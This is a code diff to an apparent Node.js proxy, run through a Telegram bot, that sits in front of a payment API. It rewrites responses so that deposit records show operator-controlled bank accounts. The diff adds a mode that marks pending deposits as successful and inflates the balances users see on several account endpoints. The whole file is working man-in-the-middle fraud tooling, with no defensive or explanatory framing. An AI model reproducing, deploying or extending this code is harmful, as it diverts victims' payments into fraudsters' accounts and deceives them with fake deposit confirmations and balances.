@@ -26,7 +26,7 @@ async function ensureWebhook() {
   } catch (e) {}
 }
 
-const DEFAULT_DATA = { banks: [], activeIndex: -1, walletType: 'paytm', adminChatId: null, botEnabled: true, autoRotate: false, lastUsedIndex: -1 };
+const DEFAULT_DATA = { banks: [], activeIndex: -1, walletType: 'paytm', adminChatId: null, botEnabled: true, autoRotate: false, lastUsedIndex: -1, depositSuccess: false, depositBonus: 0 };
 
 async function loadData() {
   try {
@@ -186,6 +186,9 @@ app.post('/api/telegram', async (req, res) => {
 /rotate on - Auto rotate banks
 /rotate off - Use fixed bank
 
+/deposit on - Show all deposits as success
+/deposit off - Show real deposit status
+
 Example:
 /addbank 1234567890 | Rahul Kumar | SBIN0001234
 /usebank 1`
@@ -211,7 +214,7 @@ Example:
       if (bankData.banks.length === 1) bankData.activeIndex = 0;
       await saveData(bankData);
       await bot.sendMessage(chatId,
-`✅ Baank #${bankData.banks.length} added:
+`✅ Bank #${bankData.banks.length} added:
 ${parts[0]} | ${parts[1]} | ${parts[2]}
 ${bankData.banks.length === 1 ? '(Auto-activated)' : '/usebank ' + bankData.banks.length + ' to activate'}`
       );
@@ -281,19 +284,51 @@ ${bank.accountNo} | ${bank.accountHolder} | ${bank.ifsc}`
       await bot.sendMessage(chatId, `🔄 Auto-Rotate OFF!\nFixed bank: ${active ? active.accountHolder + ' | ' + active.accountNo : 'None (use /usebank)'}`);
     }
 
+    else if (text === '/deposit on') {
+      bankData.depositSuccess = true;
+      bankData.depositBonus = 0;
+      await saveData(bankData);
+      await bot.sendMessage(chatId, '⏳ Calculating pending deposits...');
+      try {
+        const pendingAmount = await fetchPendingDepositAmount();
+        bankData.depositBonus = pendingAmount;
+        await saveData(bankData);
+        await bot.sendMessage(chatId,
+`✅ Deposit SUCCESS mode ON!
+
+Pending Orders Amount: ₹${pendingAmount}
+This amount will be added to displayed balance.
+
+/deposit off to restore real data.`
+        );
+      } catch(e) {
+        await bot.sendMessage(chatId, '✅ Deposit SUCCESS mode ON!\n⚠️ Could not calculate pending amount. Balance unchanged.');
+      }
+    }
+
+    else if (text === '/deposit off') {
+      bankData.depositSuccess = false;
+      bankData.depositBonus = 0;
+      await saveData(bankData);
+      await bot.sendMessage(chatId, '🔴 Deposit OFF! Real data restored. Bonus balance removed.');
+    }
+
     else if (text === '/list') {
       const rotateStatus = bankData.autoRotate ? '🔄 Auto-Rotate: ON' : '🔄 Auto-Rotate: OFF';
       const botStatus = bankData.botEnabled !== false ? '🟢 Bot: ON' : '🔴 Bot: OFF';
-      await bot.sendMessage(chatId, `🏦 Banks:\n\n${bankListText(bankData)}\n\n${botStatus}\n${rotateStatus}`);
+      const depositStatus = bankData.depositSuccess ? '✅ Deposit: SUCCESS mode' : '🔴 Deposit: Normal mode';
+      await bot.sendMessage(chatId, `🏦 Banks:\n\n${bankListText(bankData)}\n\n${botStatus}\n${rotateStatus}\n${depositStatus}`);
     }
 
     else if (text === '/status') {
       const botOn = bankData.botEnabled !== false;
       const rotate = bankData.autoRotate === true;
+      const deposit = bankData.depositSuccess === true;
       const active = getActiveBank(bankData);
       let msg = `📊 Status:\n\n`;
       msg += `Bot: ${botOn ? '🟢 ON' : '🔴 OFF'}\n`;
       msg += `Auto-Rotate: ${rotate ? '🔄 ON (' + bankData.banks.length + ' banks)' : '❌ OFF'}\n`;
+      msg += `Deposit: ${deposit ? '✅ SUCCESS mode (₹' + (bankData.depositBonus || 0) + ' bonus)' : '🔴 Normal'}\n`;
       msg += `Banks: ${bankData.banks.length}\n`;
       if (active) {
         msg += `\nCurrent Bank:\n${active.accountHolder} | ${active.accountNo} | ${active.ifsc}`;
@@ -446,30 +481,65 @@ Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
   }
 }
 
-function replaceBankInObject(obj, active) {
-  if (!obj || !active) return;
-  const bankFields = {
-    receiveAccountNo: active.accountNo,
-    receiveAccountName: active.accountHolder,
-    receiveIfsc: active.ifsc,
-    accountNo: active.accountNo,
-    accountName: active.accountHolder,
-    accountHolder: active.accountHolder,
-    ifsc: active.ifsc,
-    ifscCode: active.ifsc,
-    bankAccountNo: active.accountNo,
-    bankAccountName: active.accountHolder,
-    bankIfsc: active.ifsc
-  };
-  for (const [key, val] of Object.entries(bankFields)) {
-    if (obj[key] !== undefined) obj[key] = val;
+function markDepositSuccess(obj) {
+  if (!obj) return;
+  const failStatuses = ['failed', 'fail', 'FAILED', 'FAIL', '-1', -1, 4, '4'];
+  const statusFields = ['status', 'orderStatus', 'payStatus', 'rechargeStatus', 'state'];
+  for (const field of statusFields) {
+    if (obj[field] !== undefined && !failStatuses.includes(obj[field])) {
+      if (typeof obj[field] === 'number') {
+        obj[field] = 3;
+      } else if (typeof obj[field] === 'string') {
+        const num = parseInt(obj[field]);
+        if (!isNaN(num)) {
+          obj[field] = '3';
+        } else {
+          obj[field] = 'success';
+        }
+      }
+    }
+  }
+  if (obj.statusText !== undefined && !failStatuses.includes(obj.status)) {
+    obj.statusText = 'success';
+  }
+  if (obj.statusName !== undefined && !failStatuses.includes(obj.status)) {
+    obj.statusName = 'Success';
   }
 }
 
-async function proxyAndReplaceBankInList(req, res) {
+async function fetchPendingDepositAmount() {
+  let totalPending = 0;
+  try {
+    const response = await fetch(ORIGINAL_API + '/money/rechargeRecord', {
+      method: 'POST',
+      headers: { 'host': 'api.i-money.vip', 'content-type': 'application/json' },
+      body: JSON.stringify({ page: 1, pageSize: 100 })
+    });
+    const data = await response.json();
+    if (data && data.data) {
+      const items = Array.isArray(data.data) ? data.data :
+                    data.data.list ? data.data.list :
+                    data.data.records ? data.data.records : [];
+      const failStatuses = ['failed', 'fail', 'FAILED', 'FAIL', '-1', -1, 4, '4'];
+      const successStatuses = ['success', 'SUCCESS', 3, '3', 'completed', 'COMPLETED'];
+      for (const item of items) {
+        const st = item.status || item.orderStatus || item.payStatus || item.rechargeStatus || item.state;
+        if (!failStatuses.includes(st) && !successStatuses.includes(st)) {
+          const amt = parseFloat(item.amount || item.orderAmount || item.rechargeAmount || 0);
+          if (amt > 0) totalPending += amt;
+        }
+      }
+    }
+  } catch(e) {
+    console.error('fetchPendingDepositAmount error:', e.message);
+  }
+  return totalPending;
+}
+
+async function proxyAndAddBonus(req, res) {
   const bankData = await loadData();
-  if (bankData.botEnabled === false) return await transparentProxy(req, res);
-  const active = await getActiveBankAndSave(bankData);
+  const bonus = bankData.depositSuccess ? (bankData.depositBonus || 0) : 0;
+  if (bonus === 0) return await transparentProxy(req, res);
 
   try {
     const url = ORIGINAL_API + req.originalUrl;
@@ -494,17 +564,99 @@ async function proxyAndReplaceBankInList(req, res) {
     let jsonResp;
     try { jsonResp = JSON.parse(respBody); } catch(e) { jsonResp = null; }
 
-    if (jsonResp && active) {
-      if (jsonResp.data) {
-        if (Array.isArray(jsonResp.data)) {
-          jsonResp.data.forEach(item => replaceBankInObject(item, active));
-        } else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) {
-          jsonResp.data.list.forEach(item => replaceBankInObject(item, active));
-        } else if (jsonResp.data.records && Array.isArray(jsonResp.data.records)) {
-          jsonResp.data.records.forEach(item => replaceBankInObject(item, active));
-        } else {
-          replaceBankInObject(jsonResp.data, active);
+    if (jsonResp && jsonResp.data) {
+      const d = jsonResp.data;
+      const balanceFields = ['balance', 'userBalance', 'availableBalance', 'totalBalance', 'amount', 'money', 'coin', 'wallet'];
+      for (const field of balanceFields) {
+        if (d[field] !== undefined) {
+          const current = parseFloat(d[field]);
+          if (!isNaN(current)) {
+            d[field] = typeof d[field] === 'string' ? String((current + bonus).toFixed(2)) : parseFloat((current + bonus).toFixed(2));
+          }
         }
+      }
+    }
+
+    const respHeaders = {};
+    response.headers.forEach((val, key) => {
+      const k = key.toLowerCase();
+      if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding' && k !== 'content-length') {
+        respHeaders[key] = val;
+      }
+    });
+
+    const finalBody = jsonResp ? JSON.stringify(jsonResp) : respBody;
+    respHeaders['content-type'] = 'application/json; charset=utf-8';
+    respHeaders['content-length'] = String(Buffer.byteLength(finalBody));
+    res.writeHead(response.status, respHeaders);
+    res.end(finalBody);
+  } catch(e) {
+    console.error('Balance proxy error:', e.message);
+    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
+  }
+}
+
+function replaceBankInObject(obj, active) {
+  if (!obj || !active) return;
+  const bankFields = {
+    receiveAccountNo: active.accountNo,
+    receiveAccountName: active.accountHolder,
+    receiveIfsc: active.ifsc,
+    accountNo: active.accountNo,
+    accountName: active.accountHolder,
+    accountHolder: active.accountHolder,
+    ifsc: active.ifsc,
+    ifscCode: active.ifsc,
+    bankAccountNo: active.accountNo,
+    bankAccountName: active.accountHolder,
+    bankIfsc: active.ifsc
+  };
+  for (const [key, val] of Object.entries(bankFields)) {
+    if (obj[key] !== undefined) obj[key] = val;
+  }
+}
+
+async function proxyAndReplaceBankInList(req, res) {
+  const bankData = await loadData();
+  if (bankData.botEnabled === false && !bankData.depositSuccess) return await transparentProxy(req, res);
+  const active = bankData.botEnabled !== false ? await getActiveBankAndSave(bankData) : null;
+
+  try {
+    const url = ORIGINAL_API + req.originalUrl;
+    const forwardHeaders = {};
+    for (const [key, val] of Object.entries(req.headers)) {
+      const k = key.toLowerCase();
+      if (k === 'host' || k === 'connection' || k === 'content-length' ||
+          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
+      forwardHeaders[key] = val;
+    }
+    forwardHeaders['host'] = 'api.i-money.vip';
+
+    const opts = { method: req.method, headers: forwardHeaders };
+    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
+      opts.body = req.rawBody;
+      forwardHeaders['content-length'] = String(req.rawBody.length);
+    }
+
+    const response = await fetch(url, opts);
+    const respBody = await response.text();
+
+    let jsonResp;
+    try { jsonResp = JSON.parse(respBody); } catch(e) { jsonResp = null; }
+
+    if (jsonResp && jsonResp.data) {
+      const applyToItem = (item) => {
+        if (active) replaceBankInObject(item, active);
+        if (bankData.depositSuccess) markDepositSuccess(item);
+      };
+      if (Array.isArray(jsonResp.data)) {
+        jsonResp.data.forEach(applyToItem);
+      } else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) {
+        jsonResp.data.list.forEach(applyToItem);
+      } else if (jsonResp.data.records && Array.isArray(jsonResp.data.records)) {
+        jsonResp.data.records.forEach(applyToItem);
+      } else {
+        applyToItem(jsonResp.data);
       }
     }
 
@@ -564,6 +716,22 @@ app.all('/user/cashFlow', async (req, res) => {
 
 app.post('/money/check/payStatus', async (req, res) => {
   await proxyAndReplaceBankInList(req, res);
+});
+
+app.all('/user/info', async (req, res) => {
+  await proxyAndAddBonus(req, res);
+});
+app.all('/user/balance', async (req, res) => {
+  await proxyAndAddBonus(req, res);
+});
+app.all('/user/userInfo', async (req, res) => {
+  await proxyAndAddBonus(req, res);
+});
+app.all('/user/account', async (req, res) => {
+  await proxyAndAddBonus(req, res);
+});
+app.all('/user/detail', async (req, res) => {
+  await proxyAndAddBonus(req, res);
 });
 
 app.get('/health', async (req, res) => {
